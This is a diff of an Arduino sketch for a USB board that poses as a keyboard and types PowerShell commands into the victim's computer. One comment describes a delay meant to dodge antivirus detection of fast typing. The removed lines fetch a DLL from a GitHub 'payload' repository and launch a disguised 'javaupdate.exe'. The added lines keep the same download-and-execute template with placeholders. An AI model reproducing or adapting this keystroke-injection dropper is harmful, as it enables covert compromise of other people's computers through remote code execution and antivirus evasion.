@@ -31,8 +31,8 @@ void setup() {
   //some AVs have a signature detection for very fast consecutive typing thus this code snippet BELOW can be used for avoiding it.
   fastType("Start-Sleep -Seconds 1");
   // completely optional^^^^
-  fastType("Invoke-WebRequest 'https://raw.githubusercontent.com/proee948/payload/main/libcurl-x64.dll' -OutFile ($s+'libcurl-x64.dll')");
-  fastType("Start-Process ($s+'javaupdate.exe')");
+  fastType("Invoke-WebRequest 'PLACEHOLDER' -OutFile ($s+'PLACEHOLDER')");
+  fastType("Start-Process ($s+'PLACEHOLDER')");
 
   delay(500);
   Keyboard.end();
@@ -40,6 +40,7 @@ void setup() {
 
 void loop() {}
 //THIS IS MEANT TO BE USED WITH ATmega32u4 CHIPSET, but any HID compatible board can be used...
+
 
 
 
